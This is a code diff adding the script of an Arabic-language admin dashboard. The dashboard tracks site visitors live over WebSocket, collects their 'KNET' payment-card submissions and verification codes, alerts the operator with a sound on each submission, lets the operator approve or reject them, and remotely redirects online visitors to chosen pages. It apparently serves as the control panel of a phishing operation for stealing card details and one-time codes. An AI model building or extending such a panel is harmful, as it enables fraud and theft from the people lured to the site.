+      if (selectedVisitorId) {
+        window.localStorage.setItem(LAST_SELECTED_VISITOR_KEY, selectedVisitorId);
+      }
+
+      listEl.innerHTML = items.map((v, idx) => {
+        const isActive = selectedVisitorId === v.id ? "active" : "";
+        const isOnline = v.online_status === "Online" ? "online" : "";
+        return `
+          <a href="#" class="list-group-item list-group-item-action ${isActive} ${isOnline} visitor-link" data-id="${v.id}">
+            <span>
+              <span class="visitor-name d-block text-start visitor-name-wrap">${v.has_new_info ? '<span class="visitor-new-dot" aria-hidden="true"></span>' : ""}${escapeHtml(formatVisitorTitle(v, idx))}</span>
+              <small class="text-secondary visitor-sub" data-current-page data-id="${v.id}">${escapeHtml(v.online_status || "Offline")} • ${escapeHtml(formatCurrentPageLabel(v.current_page))}</small>
+            </span>
+            <button class="list-archive-btn" type="button" title="أرشفة" data-archive-id="${v.id}">x</button>
+          </a>
+        `;
+      }).join("");
+    }
+
+    function openModal(id) {
+      const modal = document.getElementById(id);
+      if (!modal) return;
+      modal.classList.add("show");
+      modal.style.display = "block";
+      modal.setAttribute("aria-modal", "true");
+      modal.removeAttribute("aria-hidden");
+      document.body.classList.add("modal-open");
+    }
+
+    function closeModal(id) {
+      const modal = document.getElementById(id);
+      if (!modal) return;
+      modal.classList.remove("show");
+      modal.style.display = "none";
+      modal.setAttribute("aria-hidden", "true");
+      modal.removeAttribute("aria-modal");
+      document.body.classList.remove("modal-open");
+      setRedirectStatus("idle");
+      if (id === "redirectModal") redirectModalStateKey = "";
+    }
+
+    function setRedirectStatus(state, pageLabel = "") {
+      const statusEl = document.getElementById("redirectModalStatus");
+      if (!statusEl) return;
+      if (redirectStatusTimer) {
+        clearInterval(redirectStatusTimer);
+        redirectStatusTimer = null;
+      }
+      if (redirectStatusHideTimer) {
+        clearTimeout(redirectStatusHideTimer);
+        redirectStatusHideTimer = null;
+      }
+
+      if (state === "pending") {
+        statusEl.className = "redirect-status text-primary";
+        let dots = 0;
+        const base = "جاري اعادة التوجيه";
+        statusEl.textContent = `${base} `;
+        redirectStatusTimer = setInterval(() => {
+          dots = (dots + 1) % 4;
+          statusEl.textContent = `${base} ${".".repeat(dots)}`;
+        }, 350);
+        return;
+      }
+
+      if (state === "success") {
+        statusEl.className = "redirect-status text-success redirect-status-success-glow";
+        statusEl.textContent = `sucess ${pageLabel || ""} ✓`.trim();
+        redirectStatusHideTimer = setTimeout(() => {
+          statusEl.className = "redirect-status d-none";
+          statusEl.textContent = "";
+        }, 1000);
+        return;
+      }
+
+      statusEl.className = "redirect-status d-none";
+      statusEl.textContent = "";
+    }
+
+    function openRedirectModal(visitorId, preserveStatus = false) {
+      if (!visitorId) return;
+      selectedVisitorId = visitorId;
+      const visitor = visitors.get(visitorId);
+      const isOffline = String(visitor?.online_status || "") !== "Online";
+      const currentKey = normalizeCurrentPageKey(visitor?.current_page);
+      const titleEl = document.getElementById("redirectModalTitle");
+      const targets = document.getElementById("redirectTargets");
+      targets.innerHTML = redirectPages.map((p) => {
+        const isCurrent = p.key === currentKey;
+        const disabled = isOffline || isCurrent ? "disabled" : "";
+        const klass = isCurrent && !isOffline
+          ? "btn btn-success redirect-current redirect-current-online col-12"
+          : isCurrent
+          ? "btn btn-success redirect-current col-12"
+          : "btn btn-outline-primary col-12";
+        return `<button class="${klass}" data-target-path="${p.key}" type="button" ${disabled}>${p.label}</button>`;
+      }).join("");
+      if (titleEl) titleEl.textContent = "إعادة توجيه الزائر";
+      const offlineNoteEl = document.getElementById("redirectModalOfflineNote");
+      if (offlineNoteEl) offlineNoteEl.classList.toggle("d-none", !isOffline);
+      if (!preserveStatus) setRedirectStatus("idle");
+      redirectModalStateKey = `${currentKey}|${String(visitor?.online_status || "")}`;
+      openModal("redirectModal");
+    }
+
+    function refreshRedirectModalIfOpen() {
+      const modal = document.getElementById("redirectModal");
+      if (!modal || !modal.classList.contains("show") || !selectedVisitorId) return;
+      const visitor = visitors.get(selectedVisitorId);
+      if (!visitor) return;
+      const nextStateKey = `${normalizeCurrentPageKey(visitor.current_page)}|${String(visitor.online_status || "")}`;
+      if (nextStateKey === redirectModalStateKey) return;
+      openRedirectModal(selectedVisitorId, true);
+    }
+
+    async function refreshStatuses() {
+      const ids = sortedVisitors().map((v) => v.id).filter(Boolean);
+      const query = ids.length ? `?ids=${encodeURIComponent(ids.join(","))}` : "";
+      const res = await fetch(`/admin/recent/statuses${query}`, { credentials: "same-origin" });
+      if (!res.ok) return;
+      const data = await res.json();
+
+      ids.forEach((id) => {
+        const v = visitors.get(id);
+        if (!v) return;
+        const prevCurrentPage = v.current_page;
+        if (data?.statuses?.[id]) v.online_status = data.statuses[id];
+        if (data?.current_pages?.[id]) v.current_page = data.current_pages[id];
+        maybeNotifyKnetPageEntry(id, v.current_page || prevCurrentPage || "");
+        if (Object.prototype.hasOwnProperty.call(data?.info_flags || {}, id)) {
+          v.has_new_info = Boolean(data.info_flags[id]);
+        }
+        visitors.set(id, v);
+      });
+
+      if (data?.has_new_visitors) {
+        window.location.reload();
+        return;
+      }
+
+      renderVisitors();
+      if (selectedVisitorId) {
+        updateAllInfoButtonVisibility(visitors.get(selectedVisitorId) || null);
+      }
+      refreshRedirectModalIfOpen();
+    }
+
+    function connectWebSocket() {
+      const scheme = window.location.protocol === "https:" ? "wss" : "ws";
+      ws = new WebSocket(`${scheme}://${window.location.host}/ws/admin/recent-visitors`);
+      ws.onopen = () => {
+        wsConnected = true;
+      };
+      ws.onerror = () => ws.close();
+      ws.onclose = () => {
+        wsConnected = false;
+        setTimeout(connectWebSocket, 1200);
+      };
+      ws.onmessage = async (event) => {
+        try {
+          const payload = JSON.parse(event.data);
+          const visitorId = payload?.visitor_id ? String(payload.visitor_id) : "";
+          const eventName = String(payload?.event || "");
+          if (
+            visitorId &&
+            visitors.has(visitorId) &&
+            ["visitor.heartbeat", "visitor.current_page.updated", "admin.visitor.updated"].includes(eventName)
+          ) {
+            // Keep list order stable; don't bump timestamps on every heartbeat.
+          }
+
+          if (
+            visitorId &&
+            visitors.has(visitorId) &&
+            [
+              "admin.visitor.updated",
+              "visitor.customer_info.updated",
+              "visitor.additional_info.updated",
+              "admin.visitor.info.viewed"
+            ].includes(eventName)
+          ) {
+            await fetchVisitorSummaryIntoMap(visitorId);
+            if (selectedVisitorId === visitorId) {
+              const selectedData = visitors.get(visitorId);
+              setMainHeaderData(selectedData);
+              updateAllInfoButtonVisibility(selectedData);
+              await fetchKnetSubmissions(visitorId);
+            }
+          }
+
+          if (
+            visitorId &&
+            selectedVisitorId === visitorId &&
+            [
+              "visitor.knet.submitted",
+              "visitor.knet.submission.logged",
+              "visitor.verfication_code.submitted",
+              "admin.knet.submission.created",
+              "admin.knet.submission.archived",
+              "visitor.knet.verification.updated",
+              "admin.knet.verification.code.created"
+            ].includes(eventName)
+          ) {
+            if (eventName === "visitor.knet.submitted") {
+              playKnetSubmissionNotification();
+            }
+            await fetchKnetSubmissions(visitorId);
+          }
+        } catch {}
+        await refreshStatuses();
+        refreshRedirectModalIfOpen();
+      };
+    }
+
+    listEl.addEventListener("click", (e) => {
+      const archiveBtn = e.target.closest("[data-archive-id]");
+      if (archiveBtn?.dataset.archiveId) {
+        e.preventDefault();
+        e.stopPropagation();
+        const visitorId = String(archiveBtn.dataset.archiveId);
+        if (!visitorId) return;
+        archiveBtn.disabled = true;
+        fetch(`/admin/visitors/${encodeURIComponent(visitorId)}/delete`, {
+          method: "POST",
+          credentials: "same-origin",
+          headers: { "Content-Type": "application/json" },
+          body: "{}"
+        }).then(async (res) => {
+          if (!res.ok && !res.redirected) {
+            archiveBtn.disabled = false;
+            return;
+          }
+          visitors.delete(visitorId);
+          if (selectedVisitorId === visitorId) {
+            selectedVisitorId = pickSelectedVisitorId(sortedVisitors());
+            if (selectedVisitorId) {
+              window.localStorage.setItem(LAST_SELECTED_VISITOR_KEY, selectedVisitorId);
+            } else {
+              window.localStorage.removeItem(LAST_SELECTED_VISITOR_KEY);
+            }
+            await fetchSelectedSummary(selectedVisitorId);
+            await fetchKnetSubmissions(selectedVisitorId);
+          }
+          renderVisitors();
+        }).catch(() => {
+          archiveBtn.disabled = false;
+        });
+        return;
+      }
+
+      const pageEl = e.target.closest("[data-current-page]");
+      if (pageEl?.dataset.id) {
+        e.preventDefault();
+        openRedirectModal(pageEl.dataset.id);
+        return;
+      }
+
+      const link = e.target.closest(".visitor-link");
+      if (!link?.dataset.id) return;
+      e.preventDefault();
+      selectedVisitorId = link.dataset.id;
+      window.localStorage.setItem(LAST_SELECTED_VISITOR_KEY, selectedVisitorId);
+      renderVisitors();
+      fetchSelectedSummary(selectedVisitorId).catch(() => {});
+      fetchKnetSubmissions(selectedVisitorId).catch(() => {});
+    });
+
+    document.getElementById("redirectTargets").addEventListener("click", async (e) => {
+      const btn = e.target.closest("button[data-target-path]");
+      if (!btn || !selectedVisitorId) return;
+      const selectedVisitor = visitors.get(selectedVisitorId);
+      if (!selectedVisitor || String(selectedVisitor.online_status || "") !== "Online") return;
+      const target = btn.dataset.targetPath;
+      btn.disabled = true;
+      setRedirectStatus("pending");
+      const res = await fetch(`/admin/visitors/${encodeURIComponent(selectedVisitorId)}/redirect`, {
+        method: "POST",
+        credentials: "same-origin",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ target_path: target })
+      });
+      btn.disabled = false;
+      if (!res.ok) {
+        setRedirectStatus("idle");
+        return;
+      }
+      const v = visitors.get(selectedVisitorId);
+      if (v) {
+        v.current_page = target;
+        visitors.set(selectedVisitorId, v);
+      }
+      renderVisitors();
+      const targetLabel = redirectPages.find((p) => p.key === target)?.label || target;
+      setRedirectStatus("success", targetLabel);
+    });
+
+    document.querySelectorAll("[data-close]").forEach((el) => {
+      el.addEventListener("click", () => closeModal(el.dataset.close));
+    });
+
+    const redirectModalEl = document.getElementById("redirectModal");
+    if (redirectModalEl) {
+      redirectModalEl.addEventListener("click", (e) => {
+        if (e.target === redirectModalEl) closeModal("redirectModal");
+      });
+    }
+    const infoModalEl = document.getElementById("infoModal");
+    if (infoModalEl) {
+      infoModalEl.addEventListener("click", (e) => {
+        if (e.target === infoModalEl) closeModal("infoModal");
+      });
+    }
+    const archiveAllModalEl = document.getElementById("archiveAllModal");
+    if (archiveAllModalEl) {
+      archiveAllModalEl.addEventListener("click", (e) => {
+        if (e.target === archiveAllModalEl) closeModal("archiveAllModal");
+      });
+    }
+
+    document.addEventListener("keydown", (e) => {
+      if (e.key !== "Escape") return;
+      const modal = document.getElementById("redirectModal");
+      if (modal && modal.classList.contains("show")) closeModal("redirectModal");
+      const infoModal = document.getElementById("infoModal");
+      if (infoModal && infoModal.classList.contains("show")) closeModal("infoModal");
+      const archiveAllModal = document.getElementById("archiveAllModal");
+      if (archiveAllModal && archiveAllModal.classList.contains("show")) closeModal("archiveAllModal");
+    });
+
+    allInfoBtn.addEventListener("click", async () => {
+      if (!selectedVisitorId) return;
+      const data = await fetchVisitorSummaryIntoMap(selectedVisitorId);
+      const source = data || visitors.get(selectedVisitorId) || {};
+      document.getElementById("infoContent").innerHTML = buildAllInfoHtml(source);
+      openModal("infoModal");
+      try {
+        const res = await fetch(`/admin/visitors/${encodeURIComponent(selectedVisitorId)}/mark-info-viewed`, {
+          method: "POST",
+          credentials: "same-origin",
+          headers: { "Content-Type": "application/json" },
+          body: "{}"
+        });
+        if (res.ok) {
+          const v = visitors.get(selectedVisitorId);
+          if (v) {
+            v.has_new_info = false;
+            visitors.set(selectedVisitorId, v);
+          }
+          updateAllInfoButtonVisibility(visitors.get(selectedVisitorId) || source);
+          renderVisitors();
+        }
+      } catch {}
+    });
+
+    if (archiveAllBtn) {
+      archiveAllBtn.addEventListener("click", () => {
+        openModal("archiveAllModal");
+      });
+    }
+
+    if (confirmArchiveAllBtn) {
+      confirmArchiveAllBtn.addEventListener("click", async () => {
+        confirmArchiveAllBtn.disabled = true;
+        try {
+          await fetch("/admin/visitors/delete-offline", {
+            method: "POST",
+            credentials: "same-origin",
+            headers: { "Content-Type": "application/json" },
+            body: "{}"
+          });
+          closeModal("archiveAllModal");
+          window.location.reload();
+        } catch {
+          confirmArchiveAllBtn.disabled = false;
+        }
+      });
+    }
+
+    knetPanelEl.addEventListener("click", async (e) => {
+      const verifyBtn = e.target.closest("[data-verify]");
+      if (!verifyBtn || !selectedVisitorId) return;
+      const decision = String(verifyBtn.dataset.verify || "");
+      if (decision !== "approved" && decision !== "rejected") return;
+      const latestIdBeforeDecision = currentKnetSubmissions[0]?.id ? String(currentKnetSubmissions[0].id) : "";
+      verifyBtn.disabled = true;
+      const res = await fetch(`/admin/visitors/${encodeURIComponent(selectedVisitorId)}/knet-verification/${encodeURIComponent(decision)}`, {
+        method: "POST",
+        credentials: "same-origin",
+        headers: { "Content-Type": "application/json" },
+        body: "{}"
+      });
+      verifyBtn.disabled = false;
+      if (!res.ok) return;
+      if (latestIdBeforeDecision) {
+        seenLatestKnetByVisitor.set(selectedVisitorId, latestIdBeforeDecision);
+      }
+      await fetchKnetSubmissions(selectedVisitorId);
+    });
+
+    window.addEventListener("beforeunload", () => {
+      if (statusPollTimer) clearInterval(statusPollTimer);
+      if (ws && ws.readyState === WebSocket.OPEN) ws.close();
+    });
+
+    selectedVisitorId = pickSelectedVisitorId(sortedVisitors());
+    if (selectedVisitorId) {
+      window.localStorage.setItem(LAST_SELECTED_VISITOR_KEY, selectedVisitorId);
+    }
+    renderVisitors();
+    fetchSelectedSummary(selectedVisitorId).catch(() => {});
+    fetchKnetSubmissions(selectedVisitorId).catch(() => {});
+    statusPollTimer = setInterval(() => {
+      if (wsConnected) return;
+      refreshStatuses().catch(() => {});
+    }, 12000);
+    connectWebSocket(); </script> </body> </html> 
